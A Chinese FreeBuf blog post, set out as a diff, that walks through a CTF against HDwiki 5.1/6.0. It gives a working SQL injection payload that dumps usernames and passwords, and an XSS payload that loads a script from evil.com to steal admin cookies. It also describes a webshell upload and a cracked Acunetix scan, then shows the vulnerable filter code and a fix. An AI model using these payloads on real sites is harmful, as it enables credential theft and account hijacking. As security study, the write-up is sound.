@@ -1,0 +1,89 @@
+**最近在刷CTF的题，遇到一道使用HDwiki5.1作为背景的Web题目，解题思路是利用SQL注入漏洞爆出用户名和密码，然后使用用户名和密码登录进去，再利用网站提供的模板上传功能上传一句话木马，从而获得flag。本来是一个很常见的解题思路，但是这道题目特别之处在于SQL注入漏洞的注入点比较特殊，存在SQL注入漏洞的URL为：**
+
+    
+    
+    http://www.hdwiki.com/index.php?edition-compare
+
+正常情况下提交的参数格式为：
+
+    
+    
+    editions_19=4&editions_18=3&eid[]=17&editions_17=2&eid[]=16&editions_16=1&did=35
+
+其中比较重要的参数就是eid[]数组，数组中的元素就是真正要比较的两个版本，而实际在构造SQL注入代码时增加了数组元素的长度，利用服务器只对数组前两个元素进行检查的缺陷实现了SQL注入，POC代码如下。
+
+    
+    
+    eid[0]=2&eid[1]=19&eid[2]=-3) UNION SELECT 1,2,3,4,5,6,7,8,9,10,user(),username,password,14,15,16,17,18,19 from wiki_user#
+
+考虑到SQL注入点比较特殊，所以想利用自动化工具AVWS进行一次漏洞扫描，看看AVWS是否能够发现该漏洞，结果是无法发现该漏洞，但是并不是一点收获也没有，利用AVWS发现了一个XSS漏洞，可以利用该漏洞实现“Cookie劫持攻击”，效果和SQL注入攻击爆出用户名密码一样，同样能够上传一句话木马。并且，在最新版HDWiki6.0中，该漏洞也没有得到修复，撰写本篇博客的主要目的就是记录这一次完整的AVWS漏洞扫描实战。
+
+Acunetix是自动化Web应用程序安全测试的先驱，AVWS是Acunetix Web Vulnerability
+Scanner软件的字母缩写版，它是一款强大的Web服务器漏洞扫描程序，能够轻松的发现网站中的各种漏洞。AVWS使用的创新技术包括：
+
+> （1）DeepScan —— 用于抓取AJAX 密集型客户端单页面应用程序（SPA）
+>
+> （2）业界最先进的SQL注入和跨站点脚本（XSS）测试，包括基于DOM的XSS的高级检测
+>
+> （3）AcuSensor —— 将黑盒扫描技术与放置在源代码中的传感器的反馈相结合
+
+本次测试中使用的是AVWS11破解版（注意，使用AVWS10并不能扫出该漏洞），AVWS11最明显的变化就是开始采用B/S模式，双击桌面上的快捷方式，会打开浏览器，来到AVWS软件的首页。首页左侧有6个模块：Dashbord、Targets、Vulnerabilities、Scans、Reports和Settings。其中Dashbord模块以图形化的方式显示以往扫描的主要结果；Targets模块用于显示或设置扫描目标的信息，在这里可以看见2条扫描记录<http://www.hdwiki.com/>和<http://www.hdwiki6.com/>，也就是事先部署好的HDwiki5.1版本和6.0版本，在该模块中还可以使用Add
+Target按钮增加新的扫描目标并开始扫描；Vulnerabilities模块用于显示所有漏洞的详细信息，可以选择其中的任意漏洞进行查看；Scnas模块用于显示所有扫描记录的详细信息，可以查看扫描耗费的时间，扫描出多少漏洞等等；Reports模块用于将扫描结果生成报告；Settings模块用于查看和设置软件的相关配置信息。
+
+![](https://image.3001.net/images/20190412/1555037086_5caffb9ecde4d.png!small)通过上图可以看出，使用AVWS11对HDwiki5.1和HDwiki6.0版本进行扫描，扫描出的漏洞数量大致相同，其中高危漏洞（红色标记的）都只有1个，也就是接下来要详细讲解的XSS漏洞。两个漏洞的形成原因和危害性基本一致，就以HDwiki
+6.0版本为例，详细分析该漏洞出现的原因以及如何利用和修复。
+
+进入Vulnerabilities，选择其中的高危漏洞Cross Site Scripting，查看该漏洞的主要信息，重点关注发送的HTTP
+request。
+
+![](https://image.3001.net/images/20190412/1555038751_5cb0021fd5022.png!small)
+
+    
+    
+    GET /index.php?search-fulltext-title-%2565%253C%2553%2563%2552%2569%2550%2574%2520%253E%2551%2572%2541%254E%25289515%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E--all-0-within-time-desc-1 HTTP/1.1Referer: http://www.hdwiki6.com/Cookie: PHPSESSID=qf9ottklogjo933tcphdg1l1b1; hd_sid=FFLH1E; bdshare_firstime=1555029035963; BAIDUID=3FC37797246BB4E26D2F57A333107A3E:FG=1; hd_vote_0_21=21Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*Host: www.hdwiki6.com
+
+通过查看该漏洞的详细信息，知道AVWS使用e<ScRiPt
+>QrAN(9515)</sCripT>作为POC代码，验证<http://www.hdwiki6.com/index.php>是否存在XSS漏洞。
+
+![](https://image.3001.net/images/20190412/1555045856_5cb01de0a0799.png!small)
+
+将POC代码替换为相应的攻击代码即可实现攻击目的。本次测试的攻击目的是利用该漏洞实现“Cookie劫持攻击”，于是构造攻击代码如下：
+
+    
+    
+    <ScRiPt src=http://www.evil.com/evil.js</sCripT>
+
+经过URL编码后为：
+
+    
+    
+    %3c%53%63%52%69%50%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%77%77%77%2e%65%76%69%6c%2e%63%6f%6d%2f%65%76%69%6c%2e%6a%73%3e%3c%2f%73%43%72%69%70%54%3e
+
+在HDwiki网站的高级搜索功能中输入编码后的攻击代码，可以发现攻击代码成功注入，页面发生跳转，并且[www.evil.com](http://www.evil.com/)服务器上多出了cookie.txt文件，从而成功盗取admin用户的cookie（前提是已使用admin账户进行登录），然后就可以利用盗取的Cookie进行登录。以上就是利用AVWS扫描发现漏洞，并利用漏洞实现“Cookie劫持攻击”的完整过程。
+
+![](https://image.3001.net/images/20190412/1555044699_5cb0195b2d971.png!small)
+
+![](https://image.3001.net/images/20190412/1555045552_5cb01cb048df3.png!small)
+
+![](https://image.3001.net/images/20190412/1555045609_5cb01ce94d3e2.png!small)
+
+下面分析漏洞出现的原因，通过刚才测试POC代码的过程可以知道，在使用网站提供的搜索功能进行搜索时，服务器返回的页面中可能被注入脚本代码，因为服务器并没有对用户输入的关键字做足够严格的检查，查看服务器端PHP源码可以发现，服务端使用了如下的代码对用户输入的关键字进行过滤，而这显然是不够的。
+
+    
+    
+    function checksecurity() {    $check_array = array('get'=>array('cast', 'exec','show ','show/*','alter ','alter/*','create ','create/*','insert ','insert/*', 'select ','select/*','delete ','delete/*','update ', 'update/*','drop ','drop/*','truncate ','truncate/*','replace ','replace/*','union ','union/*','execute', 'from', 'declare', 'varchar', 'script', 'iframe', ';', '0x', '<', '>', '\\', '%27', '%22', '(', ')'),);    foreach ($check_array as $check_key=>$check_val) {        if(!empty($this->$check_key)) {            foreach($this->$check_key as $getvalue) {                foreach ($check_val as $invalue) {                    if(stripos($getvalue, $invalue) !== false){                        $this->notfound('page is not found!');                        //exit('No Aceess!注意敏感词!');                        }                    }                }            }        }    }
+
+那么如何修复该XSS漏洞呢？修复XSS漏洞的有两个基本基本思路，过滤输入和过滤输出。首先分析过滤输入，对于用户搜索的输入框而言，网站并不能过滤太多数据，因为用户的输入具有不确定性，该网站的PHP源码中已经对很多的字符串进行了过滤，但是还是存在XSS漏洞，因此对于这个漏洞而言，过滤输入显然不合适，而是应该换另一个思路，过滤输出。在输出页面的过程，对可能存在的恶意代码进行转义显然是一个比较有效的方式，于是定位生成返回页面的PHP源码。
+
+    
+    
+    $title=htmlspecialchars(stripslashes($element['keyword']));$this->view->assign("title",$title);$this->view->assign("keyword",rawurlencode($element['keyword']));$this->view->assign("searchword",urlencode(string::hiconv($title,'utf-8')));$this->view->assign("search_tip_switch", $this->setting['search_tip_switch']);$this->view->assign('cloudsearch',$cloudsearch);$this->view->assign('categorylist',$categorylist);$this->view->assign("searchtext",$searchtext);$this->view->assign("list",$list);$this->view->assign("count",$count);$this->view->assign('navtitle',$this->view->lang['search'].'-'.stripslashes(stripslashes($element['keyword'])));$this->view->assign("departstr",$departstr);
+
+查看该代码可以发现，在输出页面之前，服务器端已经对$title这个变量进行了转义，但是还是存在一个疏忽，那就是没有对$serchtext变量进行转义，因此在输出$serchtext前对$serchtext进行转义就可以修复该漏洞，具体代码如下：
+
+    
+    
+    $serchtext=htmlspecialchars(stripslashes($serchtext));
+
+ ***本文作者：艾瑞斯0315，转载请注明来自FreeBuf.COM**
+
